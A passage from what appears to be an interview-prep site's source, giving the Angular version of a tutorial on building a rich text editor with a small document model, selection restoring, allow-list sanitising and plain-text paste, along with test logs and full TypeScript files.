  const has = (m) => runs.length > 0 && runs.every((r) => r[m]);
  return {
    b: has("b"),
    i: has("i"),
    u: has("u"),
    block: blocks[sel.start.b]?.type || "p",
  };
}

// One entry point for the UI: read DOM + selection, apply, write back, restore.
export function runCommand(root, cmd) {
  // A keyboard user may have tabbed to the
  // toolbar. Focusing the editor can move
  // the caret in some engines, so save the selection first and put it back.
  if (document.activeElement !== root) {
    const saved = readSelection(root);
    root.focus({ preventScroll: true });
    if (saved) writeSelection(root, saved);
  }
  const blocks = parse(root);
  let sel = readSelection(root);
  if (!sel) return null;
  if (cmd === "b" || cmd === "i" || cmd === "u") {
    const target = expandToWord(blocks, sel);
    const next = toggleMark(blocks, target, cmd);
    root.innerHTML = render(next);
    writeSelection(root, sel); // the caret stays where the user left it
  } else {
    root.innerHTML = render(toggleList(blocks, sel, cmd));
    writeSelection(root, sel);
  }
  return parse(root);
}

// Paste as plain text: the safest sanitiser is not accepting markup at all.
export function pastePlain(root, text) {
  const s = document.getSelection();
  if (!s || !s.rangeCount || !root.contains(s.anchorNode)) return;
  const r = s.getRangeAt(0);
  r.deleteContents();
  const node = document.createTextNode(text);
  r.insertNode(node);
  r.setStartAfter(node);
  r.collapse(true);
  s.removeAllRanges();
  s.addRange(r);
}
export const INITIAL = [
  {
    type: "p",
    runs: [
      { text: "Release notes for " },
      { text: "version 2", b: true },
      { text: " are ready." },
    ],
  },
  { type: "p", runs: [{ text: "Fixed the date picker" }] },
  { type: "p", runs: [{ text: "Faster spreadsheet recalculation" }] },
];
`,
        },
      },
      angular: {
        answer: `**Target Audience:** Angular developers preparing for a machine coding round. Assumes standalone components, \`@ViewChild\` and signals.
**Difficulty:** Hard

> **How to read this doc:** Plain words first, then a <code>📌 Interview term:</code> callout. "Verified" output was printed by the real code: this Angular 22.2.3 component in jsdom, compiled AOT with strict templates and again with runtime JIT (the playground mode), and the same component in headless Chromium 141 with real typing and clicks.

## 1. Why This Even Matters — A Story First

If everyone scribbles bold marks onto a shared page, it ends up with three kinds of bold, pasted colours, and possibly a script. A careful secretary reads the page into a tidy list, changes the list, and rewrites the page neatly. In an editor, \`contenteditable\` holds the page and handles typing, the caret and IME. Formatting goes through a small document model and comes back out as clean HTML.

\`document.execCommand\` is not used. MDN marks it deprecated, its markup differs between browsers, and jsdom does not implement it (\`typeof document.execCommand\` printed \`undefined\`).

## 2. Plan and the Angular Pieces

| Piece | Angular tool | Notes |
| :--- | :--- | :--- |
| Editable element | \`@ViewChild("body")\`, **no template children** | Angular never renders inside it. |
| Toolbar state | \`signal<Active>()\` | \`{ b, i, u, block }\` for \`aria-pressed\`. |
| Output | \`@Output() htmlChange\` | Normalised HTML after each change. |
| Setup | \`ngAfterViewInit\` | The element exists only after the view is created. |
| Teardown | \`ngOnDestroy\` | Removes the \`document\` listener. |

📌 **Interview term: Document model** — \`type Block = { type: "p" | "ul" | "ol"; runs: Run[] }\` with \`type Run = { text: string; b: boolean; i: boolean; u: boolean }\`. The model functions in \`editor.ts\` are plain TypeScript, the same code as the React and Vue \`editor.js\`, with types added.

## 3. Build It Step by Step

### 3.1 Parse, render, commands

- **\`parse(root)\`** turns known marks (\`STRONG\`, \`B\`, \`EM\`, \`I\`, \`U\`) into flags and known blocks into blocks. Everything else is unwrapped to its text, and \`SCRIPT\` and \`STYLE\` are dropped. Attributes are never copied.
- **\`render(blocks)\`** escapes text and nests marks in a fixed order, so the same content always produces the same HTML.
- **\`toggleMark\`** splits runs at the selection edges, then works all-or-nothing: it removes the mark only if every selected character already has it.
- **\`expandToWord\`** makes a bare caret format the word it is in.
- **\`toggleList\`** converts the touched blocks to a list type, or back to paragraphs.

📌 **Interview term: Sanitising by construction** — the renderer can only write allow-listed tags, so there is nothing to strip. Angular's \`DomSanitizer\` protects \`[innerHTML]\` bindings, but this editor never binds \`[innerHTML]\` at all ([DomSanitizer and XSS](/interview-question/what-are-security-vulnerabilities-in-angular-apps-and-how-does-domsanitizer-prev)).

### 3.2 Selection as model positions

\`\`\`ts
export type Pos = { b: number; o: number };
function toPos(
  root: HTMLElement,
  node: Node,
  offset: number,
): Pos | null {
  const els = blockEls(root);
  const el = els.find((e) => e === node || e.contains(node));
  if (!el) return null;
  const r = document.createRange();
  r.setStart(el, 0);
  r.setEnd(node, offset);
  return { b: els.indexOf(el), o: r.toString().length };
}
\`\`\`

Replacing \`innerHTML\` destroys the nodes the Selection referenced. So \`runCommand\` saves the selection as \`{ start: Pos, end: Pos }\`, renders, and rebuilds a \`Range\` at the same block and character offsets.

📌 **Interview term: Selection and Range** — Selection is what is highlighted; Range is two \`(container, offset)\` points. \`removeAllRanges()\` plus \`addRange()\` restores one.

### 3.3 The component

\`\`\`ts
@Component({
  selector: "app-rich-text-editor",
  standalone: true,
  template: \`
    <div
      role="toolbar"
      aria-label="Formatting"
      aria-controls="rte-body"
    >
      @for (t of tools; track t.cmd) {
        <button type="button" [attr.aria-label]="t.label" [attr.aria-pressed]="pressed(t.cmd)"
          (mousedown)="$event.preventDefault()" (click)="exec(t.cmd)">{{ t.text }}</button>
      }
    </div>
    <div #body id="rte-body" contenteditable="true" role="textbox" aria-multiline="true"
      aria-label="Release notes" (input)="refresh()" (keydown)="onKeyDown($event)"
      (keyup)="refresh()" (mouseup)="refresh()" (paste)="onPaste($event)"></div>
  \`,
})
export class RichTextEditorComponent
  implements AfterViewInit, OnDestroy
{
  @Output() htmlChange = new EventEmitter<string>();
  @ViewChild("body") body!: ElementRef<HTMLDivElement>;
  active = signal<Active>({ b: false, i: false, u: false, block: "p" });
  private onSel = () => {
    if (
      this.body.nativeElement.contains(
        document.getSelection()?.anchorNode ?? null,
      )
    )
      this.refresh();
  };
  ngAfterViewInit() {
    this.body.nativeElement.innerHTML = render(INITIAL);
    document.addEventListener("selectionchange", this.onSel);
    this.refresh();
  }
  ngOnDestroy() {
    document.removeEventListener("selectionchange", this.onSel);
  }
  refresh() {
    const blocks = parse(this.body.nativeElement);
    this.active.set(
      activeState(blocks, readSelection(this.body.nativeElement)),
    );
    this.htmlChange.emit(render(blocks));
  }
}
\`\`\`

📌 **Interview term: View queries and timing** — \`@ViewChild\` is resolved before \`ngAfterViewInit\`, so that is the first hook where \`nativeElement\` is safe to use ([afterRender vs afterNextRender vs ngAfterViewInit](/interview-question/afterrender-vs-afternextrender-vs-ngafterviewinit-which-to-use)).

Three details carry the behaviour:

- **\`(mousedown)="$event.preventDefault()"\`** keeps the editor selection when a toolbar button is clicked.
- **\`(paste)\`** calls \`preventDefault()\` and inserts \`clipboardData.getData("text/plain")\` as a text node.
- **The \`selectionchange\` arrow function** is a class field, so the same function reference can be removed in \`ngOnDestroy\`.

The first draft deferred the initial \`refresh()\` with \`queueMicrotask\`, on the theory that emitting to the parent from \`ngAfterViewInit\` would change the parent's binding during a check. A synchronous version printed identical output in both AOT and JIT with no errors or warnings. In a zoneless app, the parent's signal write schedules one more render. So the shipped code calls it directly.

\`runCommand\` saves the selection, focuses the editor only if it is not already focused, and then restores the selection. In jsdom, \`focus()\` on the editable element reset the selection. Without the save and restore, keyboard commands formatted nothing.

## 4. Verified

jsdom has Selection and Range but no editing. The driver set selections through the Selection API and fired \`selectionchange\`. Paste used a fake \`clipboardData\` object, because jsdom has no \`DataTransfer\`. AOT and JIT printed the same lines, identical to React and Vue:

\`\`\`text
initial: <p>Release notes for <strong>version 2</strong> are ready.</p><p>Fixed the date picker</p><p>Faster spreadsheet recalculation</p>
paste ' <b>bold?</b>' -> Faster &lt;b&gt;bold?&lt;/b&gt; spreadsheet recalculation</p>
select 'sion' -> pressed: b
Bold on 'Release' -> <p><strong>Release</strong> notes for <strong>version 2</strong> are ready. | selection kept: "Release" | pressed: b
select mixed -> pressed: none
Bold on mixed (makes all bold) -> <p><strong>Release notes for version 2</strong> are ready.
Bold again (removes) -> <p>Release notes for version<strong> 2</strong> are ready.
caret in 'notes' + Ctrl+I -> <p>Release <em>notes</em> for version<strong> 2</strong> are ready. | pressed: i
Bulleted list on 2 blocks -> <ul><li>Fixed the date picker</li><li>Faster &lt;b&gt;bold?&lt;/b&gt; spreadsheet recalculation</li></ul> | pressed: ul
Numbered list -> <ol><li>Fixed the date picker</li><li>Faster &lt;b&gt;bold?&lt;/b&gt; spreadsheet recalculation</li></ol>
Numbered again (back to paragraphs) -> <p>Fixed the date picker</p><p>Faster &lt;b&gt;bold?&lt;/b&gt; spreadsheet recalculation</p>
U then I on 'Faster' -> <p><em><u>Faster</u></em> &lt;b&gt;bold?&lt;/b&gt; spreadsheet recalculation | pressed: i,u
model output after hostile insert -> <p>Hi <strong>there</strong></p>
\`\`\`

Headless Chromium 141 (playwright-core), with real key presses and clicks on an esbuild bundle (JIT):

\`\`\`text
[chromium:angular] version: 141.0.7390.37
[chromium:angular] type ' Thanks!', Shift+Left x7, Ctrl+B -> <p>Release notes for <strong>version 2</strong> are ready. <strong>Thanks!</strong>
[chromium:angular]   selection after: "Thanks!" | Bold pressed: true
[chromium:angular] ArrowRight, type ' Bye' -> <p>Release notes for <strong>version 2</strong> are ready. <strong>Thanks! Bye</strong>
[chromium:angular] click Bulleted list -> <ul><li>Faster spreadsheet recalculation</li></ul> | focus in editor: editor
[chromium:angular] End, Enter, type 'New item' -> <ul><li>Faster spreadsheet recalculation</li><li>New item</li></ul>
[chromium:angular]   model output: <ul><li>Faster spreadsheet recalculation</li><li>New item</li></ul>
[chromium:angular]   focused button: Italic
[chromium:angular] Space on Italic -> <p><em>Fixed</em> the date picker</p> | focus back in editor: editor | selection: "Fixed"
[chromium:angular] console errors: none
\`\`\`

The script waited 50 ms before reading the output paragraph: zoneless Angular renders the \`htmlChange\` result asynchronously, and the first read without the wait saw the previous value. Styling and screen reader output were not checked.

## 5. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| Caret only | Formats the word |
| Mixed marks | Add to all, then remove from all |
| Hostile markup | Unknown tags unwrapped, attributes dropped, scripts removed |
| Element not ready | Setup in \`ngAfterViewInit\` |
| Toolbar | \`role="toolbar"\`, \`[attr.aria-pressed]\`, labels |
| Editor | \`role="textbox"\`, \`aria-multiline\`, a label and a focus ring |

## 6. Common Pitfalls

- **Binding \`[innerHTML]\` to a signal on every keystroke.** Angular would rewrite the nodes under the caret.
- **Using the \`@ViewChild\` element in the constructor or \`ngOnInit\`.** It is not there yet.
- **An inline listener you cannot remove.** Keep a field reference for \`removeEventListener\`.
- **Saving DOM nodes instead of model positions.** They are replaced on every command.
- **Assuming \`execCommand\` exists in tests.** jsdom does not implement it.

## 7. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">1. Reject execCommand:</strong> <span style="color:#f0e2c8;">"It is deprecated and inconsistent. <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">contenteditable</code> owns typing, and the code owns formatting."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Model:</strong> <span style="color:#f0e2c8;">"Typed blocks of runs, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">parse</code> with an allow-list, and canonical <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">render</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Selection:</strong> <span style="color:#f0e2c8;">"Save <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">{ block, offset }</code>, render, then rebuild a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">Range</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Commands:</strong> <span style="color:#f0e2c8;">"All-or-nothing <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">toggleMark</code> with run splitting, caret-to-word, and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">toggleList</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. Angular layer:</strong> <span style="color:#f0e2c8;">"<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">@ViewChild</code> used in <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">ngAfterViewInit</code>, no template children, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">preventDefault</code> on toolbar <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">mousedown</code> and on paste, and a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">signal</code> for <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">aria-pressed</code>."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you make it a form control?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Implement <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">ControlValueAccessor</code>: <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">writeValue</code> sets <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">innerHTML</code> from a sanitised value, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">registerOnChange</code> is called from <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">refresh</code>, and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">setDisabledState</code> toggles <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">contenteditable</code>.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you add undo?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Direct DOM changes are not on the browser undo stack, so keep a stack of models plus selections and push before each command.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Why not <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">effect</code> to sync <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">active</code>?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;"><code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">active</code> changes in response to DOM events, not to other signals, so it is set in the handlers; an <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">effect</code> would have nothing reactive to track.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you test it?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Unit-test <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">parse</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">toggleMark</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">toggleList</code> on plain models, and add a TestBed test that sets a Selection, clicks Bold and asserts the emitted HTML.</span>
</div>

</div>

## 8. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **Document model** | Typed blocks of runs |
| **Sanitising by construction** | Only renderer-written tags appear |
| **Selection and Range** | Highlight as container and offset pairs |
| **View queries and timing** | \`@ViewChild\` is ready in \`ngAfterViewInit\` |

---
**Conclusion:** The Angular editor keeps the browser in charge of typing and handles formatting itself. It parses the DOM into a typed model, saves the selection as model positions, runs a pure command, renders canonical HTML, and restores the selection. The component adds \`@ViewChild\` timing, \`preventDefault\` on toolbar \`mousedown\` and on paste, and a signal for pressed states. Both compilation modes and real Chromium produced the same results.`,
        files: {
          "/src/app/app.component.ts": `import { Component, signal } from "@angular/core";
import { RichTextEditorComponent } from "./rich-text-editor.component";

@Component({
  selector: "app-root",
  standalone: true,
  imports: [RichTextEditorComponent],
  styles: [
    \`
      :host {
        display: block;
        min-height: 100vh;
        margin: 0;
        background: #0f1115;
        color: #e6e6e6;
        font-family: system-ui, sans-serif;
      }
      .page {
        max-width: 680px;
        margin: 0 auto;
        padding: 20px 16px;
      }
      :host ::ng-deep .rte {
        border: 1px solid #2c3340;
        border-radius: 10px;
        background: #171a21;
        overflow: hidden;
      }
      :host ::ng-deep .rte-tools {
        display: flex;
        flex-wrap: wrap;
        gap: 4px;
        padding: 6px;
        border-bottom: 1px solid #2c3340;
      }
      :host ::ng-deep .rte-tools button {
        background: #222834;
        color: #e6e6e6;
        border: 1px solid #2c3340;
        border-radius: 6px;
        padding: 4px 10px;
        min-width: 34px;
        cursor: pointer;
        font:
          14px system-ui,
          sans-serif;
      }
      :host ::ng-deep .rte-tools button[aria-pressed="true"] {
        background: #f9a825;
        color: #1c140a;
        border-color: #f9a825;
      }
      :host ::ng-deep .t-b {
        font-weight: 700;
      }
      :host ::ng-deep .t-i {
        font-style: italic;
      }
      :host ::ng-deep .t-u {
        text-decoration: underline;
      }
      :host ::ng-deep .rte-body {
        min-height: 140px;
        padding: 10px 14px;
        outline: none;
        line-height: 1.5;
      }
      :host ::ng-deep .rte-body:focus-visible {
        box-shadow: inset 0 0 0 2px #f9a825;
      }
      :host ::ng-deep .rte-body p {
        margin: 0 0 8px;
      }
      .out {
        margin-top: 12px;
        font:
          12px ui-monospace,
          monospace;
        color: #9aa4b2;
        white-space: pre-wrap;
        word-break: break-word;
      }
    \`,
  ],
  template: \`
    <main class="page">
      <h1 style="font-size: 18px">Write release notes</h1>
      <app-rich-text-editor (htmlChange)="html.set($event)" />
      <p class="out" data-testid="out">{{ html() }}</p>
    </main>
  \`,
})
export class AppComponent {
  html = signal("");
}
`,
          "/src/app/editor.ts": `// A tiny document model for a contenteditable editor, used instead of the
// deprecated document.execCommand. The DOM owns typing; formatting commands
// read the DOM into a model, change the model, and write normalised HTML back.
//   block = { type: "p" | "ul" | "ol", runs: [{ text, b, i, u }] }
export type Run = { text: string; b?: boolean; i?: boolean; u?: boolean };
export type Block = { type: "p" | "ul" | "ol"; runs: Run[] };
export type Pos = { b: number; o: number };
export type Sel = { start: Pos; end: Pos };
export type Active = { b: boolean; i: boolean; u: boolean; block: string };
type Mark = "b" | "i" | "u";

const MARK_TAGS: Record<string, Mark> = {
  STRONG: "b",
  B: "b",
  EM: "i",
  I: "i",
  U: "u",
};
const sameMarks = (x: Run, y: Run) =>
  !!x.b === !!y.b && !!x.i === !!y.i && !!x.u === !!y.u;
const textLen = (block: Block) =>
  block.runs.reduce((n, r) => n + r.text.length, 0);

function normalise(runs: Run[]): Run[] {
  const out: Run[] = [];
  for (const r of runs) {
    if (!r.text) continue;
    const prev = out[out.length - 1];
    if (prev && sameMarks(prev, r)) prev.text += r.text;
    else out.push({ text: r.text, b: !!r.b, i: !!r.i, u: !!r.u });
  }
  return out;
}

// DOM -> model. Anything that is not a known block or mark is unwrapped to
// its text, so pasted spans, styles, scripts and attributes never survive.
export function parse(root: HTMLElement): Block[] {
  const blocks: Block[] = [];
  let loose: Run[] | null = null; // inline content sitting directly in the root
  const inline = (node: Node, marks: Omit<Run, "text">, runs: Run[]): void => {
    if (node.nodeType === 3) {
      runs.push({ text: (node.nodeValue ?? "").replace(/ /g, " "), ...marks });
      return;
    }
    const el = node as Element;
    if (
      node.nodeType !== 1 ||
      el.tagName === "SCRIPT" ||
      el.tagName === "STYLE"
    )
      return;
    const m = MARK_TAGS[el.tagName];
    const next = m ? { ...marks, [m]: true } : marks;
    node.childNodes.forEach((c) => inline(c, next, runs));
  };
  const flush = () => {
    if (loose) {
      blocks.push({ type: "p", runs: normalise(loose) });
      loose = null;
    }
  };
  root.childNodes.forEach((n) => {
    const tag = n.nodeType === 1 ? (n as Element).tagName : "";
    if (tag === "UL" || tag === "OL") {
      flush();
      (n as Element).querySelectorAll("li").forEach((li) => {
        const runs: Run[] = [];
        li.childNodes.forEach((c) => {
          if (
            c.nodeType !== 1 ||
            ((c as Element).tagName !== "UL" && (c as Element).tagName !== "OL")
          )
            inline(c, {}, runs);
        });
        blocks.push({
          type: tag.toLowerCase() as "ul" | "ol",
          runs: normalise(runs),
        });
      });
    } else if (
      tag === "P" ||
      tag === "DIV" ||
      /^H[1-6]$/.test(tag) ||
      tag === "BLOCKQUOTE"
    ) {
      flush();
      const runs: Run[] = [];
      inline(n, {}, runs);
      blocks.push({ type: "p", runs: normalise(runs) });
    } else if (tag === "BR") {
      flush();
    } else {
      if (!loose) loose = [];
      inline(n, {}, loose);
    }
  });
  flush();
  return blocks.length ? blocks : [{ type: "p", runs: [] }];
}

const esc = (s: string) =>
  s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
function runHtml(r: Run) {
  let h = esc(r.text);
  if (r.u) h = "<u>" + h + "</u>";
  if (r.i) h = "<em>" + h + "</em>";
  if (r.b) h = "<strong>" + h + "</strong>";
  return h;
}
// Model -> HTML. Consecutive list items of the same type share one list.
export function render(blocks: Block[]): string {
  let html = "",
    open: string | null = null;
  for (const bl of blocks) {
    const inner = bl.runs.length ? bl.runs.map(runHtml).join("") : "<br>";
    if (bl.type === "p") {
      if (open) {
        html += "</" + open + ">";
        open = null;
      }
      html += "<p>" + inner + "</p>";
    } else {
      if (open !== bl.type) {
        if (open) html += "</" + open + ">";
        html += "<" + bl.type + ">";
        open = bl.type;
      }
      html += "<li>" + inner + "</li>";
    }
  }
  return html + (open ? "</" + open + ">" : "");
}

// ── Selection <-> model positions { b: block index, o: character offset } ──
const blockEls = (root: HTMLElement) => [
  ...root.querySelectorAll<HTMLElement>(
    ":scope > p, :scope > ul > li, :scope > ol > li",
  ),
];

function toPos(root: HTMLElement, node: Node, offset: number): Pos | null {
  const els = blockEls(root);
  if (node === root) {
    // caret between blocks: snap to the start of the next one
    const b = Math.min(offset, els.length - 1);
    return { b: Math.max(b, 0), o: 0 };
  }
  const el = els.find((e) => e === node || e.contains(node));
  if (!el) return null;
  const r = document.createRange();
  r.setStart(el, 0);
  r.setEnd(node, offset);
  return { b: els.indexOf(el), o: r.toString().length };
}
function toPoint(root: HTMLElement, { b, o }: Pos): [Node, number] {
  const el = blockEls(root)[b];
  const walk = document.createTreeWalker(el, NodeFilter.SHOW_TEXT);
  let n: Node | null,
    seen = 0,
    lastText: Node | null = null;
  while ((n = walk.nextNode())) {
    lastText = n;
    const len = (n.nodeValue ?? "").length;
    if (seen + len >= o) return [n, o - seen];
    seen += len;
  }
  return lastText ? [lastText, (lastText.nodeValue ?? "").length] : [el, 0];
}
export function readSelection(root: HTMLElement): Sel | null {
  const s = document.getSelection();
  if (!s || !s.rangeCount || !root.contains(s.anchorNode)) return null;
  const r = s.getRangeAt(0);
  const start = toPos(root, r.startContainer, r.startOffset),
    end = toPos(root, r.endContainer, r.endOffset);
  return start && end ? { start, end } : null;
}
export function writeSelection(root: HTMLElement, sel: Sel) {
  const r = document.createRange();
  r.setStart(...toPoint(root, sel.start));
  r.setEnd(...toPoint(root, sel.end));
  const s = document.getSelection();
  s?.removeAllRanges();
  s?.addRange(r);
}

// ── Commands (pure: model in, model out) ──
const collapsed = (sel: Sel) =>
  sel.start.b === sel.end.b && sel.start.o === sel.end.o;
const isWordChar = (ch: string | undefined) => !!ch && ch !== " ";

// A caret with no selection formats the word it sits in, like Google Docs.
export function expandToWord(blocks: Block[], sel: Sel): Sel {
  if (!collapsed(sel)) return sel;
  const text = blocks[sel.start.b].runs.map((r) => r.text).join("");
  let s = sel.start.o,
    e = sel.start.o;
  while (isWordChar(text[s - 1])) s--;
  while (isWordChar(text[e])) e++;
  return { start: { b: sel.start.b, o: s }, end: { b: sel.start.b, o: e } };
}

// Character spans [from, to) of each block touched by the selection.
function spans(blocks: Block[], sel: Sel) {
  const out: { b: number; from: number; to: number }[] = [];
  for (let b = sel.start.b; b <= sel.end.b; b++)
    out.push({
      b,
      from: b === sel.start.b ? sel.start.o : 0,
      to: b === sel.end.b ? sel.end.o : textLen(blocks[b]),
    });
  return out;
}
function marksAt(block: Block, from: number, to: number): Run[] {
  // marks of every character in [from, to)
  const res: Run[] = [];
  let pos = 0;
  for (const r of block.runs) {
    const a = Math.max(from, pos),
      z = Math.min(to, pos + r.text.length);
    if (a < z) res.push(r);
    pos += r.text.length;
  }
  return res;
}
export function toggleMark(blocks: Block[], sel: Sel, mark: Mark): Block[] {
  const parts = spans(blocks, sel).filter((s) => s.from < s.to);
  if (!parts.length) return blocks;
  const all = parts.every((s) =>
    marksAt(blocks[s.b], s.from, s.to).every((r) => r[mark]),
  );
  const next = blocks.map((bl) => ({
    ...bl,
    runs: bl.runs.map((r) => ({ ...r })),
  }));
  for (const s of parts) {
    const runs: Run[] = [];
    let pos = 0;
    for (const r of next[s.b].runs) {
      // split each run at the span edges, then flip the mark inside
      const cuts = [0, s.from - pos, s.to - pos, r.text.length].map((c) =>
        Math.min(Math.max(c, 0), r.text.length),
      );
      for (let k = 0; k < 3; k++) {
        const piece = r.text.slice(cuts[k], cuts[k + 1]);
        if (piece)
          runs.push({ ...r, text: piece, [mark]: k === 1 ? !all : r[mark] });
      }
      pos += r.text.length;
    }
    next[s.b].runs = normalise(runs);
  }
  return next;
}
export function toggleList(
  blocks: Block[],
  sel: Sel,
  type: "ul" | "ol",
): Block[] {
  const all = spans(blocks, sel).every((s) => blocks[s.b].type === type);
  return blocks.map((bl, i): Block =>
    i >= sel.start.b && i <= sel.end.b ? { ...bl, type: all ? "p" : type } : bl,
  );
}
// What the toolbar shows as pressed for the current selection.
export function activeState(blocks: Block[], sel: Sel | null): Active {
  if (!sel) return { b: false, i: false, u: false, block: "p" };
  let runs: Run[];
  if (collapsed(sel)) {
    const bl = blocks[sel.start.b],
      o = sel.start.o;
    runs = marksAt(bl, Math.max(o - 1, 0), Math.max(o, 1)).slice(-1);
  } else
    runs = spans(blocks, sel).flatMap((s) =>
      marksAt(blocks[s.b], s.from, s.to),
    );
  const has = (m: Mark) => runs.length > 0 && runs.every((r) => r[m]);
  return {
    b: has("b"),
    i: has("i"),
    u: has("u"),
    block: blocks[sel.start.b]?.type || "p",
  };
}

// One entry point for the UI: read DOM + selection, apply, write back, restore.
export function runCommand(root: HTMLElement, cmd: string): Block[] | null {
  // A keyboard user may have tabbed to the
  // toolbar. Focusing the editor can move
  // the caret in some engines, so save the selection first and put it back.
  if (document.activeElement !== root) {
    const saved = readSelection(root);
    root.focus({ preventScroll: true });
    if (saved) writeSelection(root, saved);
  }
  const blocks = parse(root);
  let sel = readSelection(root);
  if (!sel) return null;
  if (cmd === "b" || cmd === "i" || cmd === "u") {
    const target = expandToWord(blocks, sel);
    const next = toggleMark(blocks, target, cmd as Mark);
    root.innerHTML = render(next);
    writeSelection(root, sel); // the caret stays where the user left it
  } else {
    root.innerHTML = render(toggleList(blocks, sel, cmd as "ul" | "ol"));
    writeSelection(root, sel);
  }
  return parse(root);
}

// Paste as plain text: the safest sanitiser is not accepting markup at all.
export function pastePlain(root: HTMLElement, text: string) {
  const s = document.getSelection();
  if (!s || !s.rangeCount || !root.contains(s.anchorNode)) return;
  const r = s.getRangeAt(0);
  r.deleteContents();
  const node = document.createTextNode(text);
  r.insertNode(node);
  r.setStartAfter(node);
  r.collapse(true);
  s.removeAllRanges();
  s.addRange(r);
}
export const INITIAL: Block[] = [
  {
    type: "p",
    runs: [
      { text: "Release notes for " },
      { text: "version 2", b: true },
      { text: " are ready." },
    ],
  },
  { type: "p", runs: [{ text: "Fixed the date picker" }] },
  { type: "p", runs: [{ text: "Faster spreadsheet recalculation" }] },
];
`,
          "/src/app/rich-text-editor.component.ts": `import {
  AfterViewInit,
  Component,
  ElementRef,
  EventEmitter,
  OnDestroy,
  Output,
  ViewChild,
  signal,
} from "@angular/core";
import {
  Active,
  INITIAL,
  activeState,
  parse,
  pastePlain,
  readSelection,
  render,
  runCommand,
} from "./editor";

const TOOLS = [
  { cmd: "b", label: "Bold", text: "B", key: "b" },
  { cmd: "i", label: "Italic", text: "I", key: "i" },
  { cmd: "u", label: "Underline", text: "U", key: "u" },
